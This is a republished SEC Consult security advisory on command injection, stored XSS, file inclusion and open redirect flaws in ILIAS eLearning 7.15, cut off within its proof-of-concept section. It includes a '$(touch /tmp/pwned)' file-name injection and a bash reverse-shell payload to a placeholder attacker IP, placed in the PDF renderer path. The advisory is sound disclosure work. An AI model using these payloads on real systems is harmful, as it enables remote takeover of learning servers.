---
title: ILIAS eLearning 7.15 Command Injection / XSS / LFI / Open Redirect
url: https://cxsecurity.com/issue/WLB-2022120023
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-10
fetch_date: 2025-10-04T01:05:14.939991
---

# ILIAS eLearning 7.15 Command Injection / XSS / LFI / Open Redirect

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ILIAS eLearning 7.15 Command Injection / XSS / LFI / Open Redirect** **2022.12.09**  Credit:  **[Anna Hartig](https://cxsecurity.com/author/Anna%2BHartig/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-45917](https://cxsecurity.com/cveshow/CVE-2022-45917/ "Click to see CVE-2022-45917")** | **[CVE-2022-45918](https://cxsecurity.com/cveshow/CVE-2022-45918/ "Click to see CVE-2022-45918")** | **[CVE-2022-45915](https://cxsecurity.com/cveshow/CVE-2022-45915/ "Click to see CVE-2022-45915")** | **[CVE-2022-45916](https://cxsecurity.com/cveshow/CVE-2022-45916/ "Click to see CVE-2022-45916")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")  [CWE-98](https://cxsecurity.com/cwe/CWE-98 "Click to see CWE-98")  [CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")  [CWE-601](https://cxsecurity.com/cwe/CWE-601 "Click to see CWE-601")** | |

SEC Consult Vulnerability Lab Security Advisory < 20221206-0 >
=======================================================================
title: Multiple critical vulnerabilities
product: ILIAS eLearning platform
vulnerable version: <= 7.15
fixed version: 7.16
CVE number: CVE-2022-45915, CVE-2022-45916, CVE-2022-45917,
CVE-2022-45918
impact: critical
homepage: https://www.ilias.de
found: 2022-09-30
by: Anna Hartig (Office Bochum)
Constantin Schwarz (Office Bochum)
Niklas Schilling (Office Munich)
SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Atos company
Europe | Asia | North America
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
"Around since 1998, ILIAS is a powerful learning management system that fulfills
all your requirements. Using its integrated tools, small and large businesses,
universities, schools and public authorities are able to create tailored,
individual learning scenarios."
Source: https://www.ilias.de/en/
Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.
SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.
Vulnerability overview/description:
-----------------------------------
1) Authenticated Direct OS Command Injection - CVE-2022-45915
ILIAS utilizes several third-party programs to perform tasks like creating PDF
files or scanning uploaded files for known viruses. These are called using the
PHP exec() function. In several instances, the arguments passed to the exec()
function contain user input that is not properly sanitized.
By performing malicious configuration steps or uploading dangerous files, an
attacker can execute arbitrary system commands with the rights of the web server
user (www-data).
The privilege required for the different instances of command injection range
from low rights to admin rights.
2) Stored Cross-Site Scripting - CVE-2022-45916
Multiple stored cross-site scripting vulnerabilities were identified in ILIAS
course items. These were either achieved by bypassing existing XSS filters or
simply by exploiting missing input validation altogether. This results in the
execution of attacker-controlled JavaScript code by the user's browser.
The attacker requires the right to create course items, e.g., as a tutor of a
course.
3) Local File Inclusion - CVE-2022-45918
The included SCORM editor features a debugger that gives authors insights into
the current SCORM player session, as well as previous sessions. When accessing
the logs of previous sessions, the debugger fails to validate the requested
file path, allowing for arbitrary filesystem access.
4) Open Redirect - CVE-2022-45917
The function shib\_logout.php redirects the user to a URL specified in the
"return" parameter. Since this parameter is not validated, an attacker can use
it to redirect a victim to an arbitrary website. This is a powerful tool in
phishing campaigns, as it allows hiding the malicious webpage behind a link that
looks like it would take you to the real ILIAS webpage.
Proof of concept:
-----------------
1) Authenticated Direct OS Command Injection - CVE-2022-45915
Multiple instances of command injection vulnerabilities were identified:
a) ZIP archive upload
Normal users with open assessments can submit their solution by uploading a ZIP
archive. These archives are extracted on the server and scanned for viruses
recursively. The directory and file names can be used by an attacker to inject
system commands, e.g., by including a directory with the name
$(touch /tmp/pwned) to the ZIP archive. Exploiting this vulnerability, an attacker
is able to get a reverse shell on the ILIAS webserver with the rights of the
web server user (www-data).
b) Media object creation
ILIAS can be configured so that users can create media objects based on files
inside an "Upload Directory". Before these objects are created, the files are
scanned for viruses. The file names can be used by an attacker to inject system
commands. By placing a file with a name like $(touch /tmp/pwned) inside the
upload directory and then creating a media object based on it, an attacker is
able to execute arbitrary system commands with the rights of www-data on the
server.
c) PDF document creation
ILIAS provides users the functionality to export content as PDF files. A user
with admin rights can configure the path to the preferred PDF renderer. An
attacker can use this parameter to inject system commands. Due to missing
input validation it is possible to inject multiple commands. The path to
wkhtmltopdf has to be included in the payload, as ILIAS checks for it. By
changing the path to:
/usr/local/bin/wkhtmltopdf; bash -c "bash -i >& /dev/tcp/<IP\_Address\_Attacker>/13373 0>&1";
an attacker can open a reverse shell with the rights of www-data that connects
to the attacker's machine on port 13373. The reverse shell is initiated when
the export function is triggered.
No PDF renderer has to be installed for this vulnerability to be exploitable.
...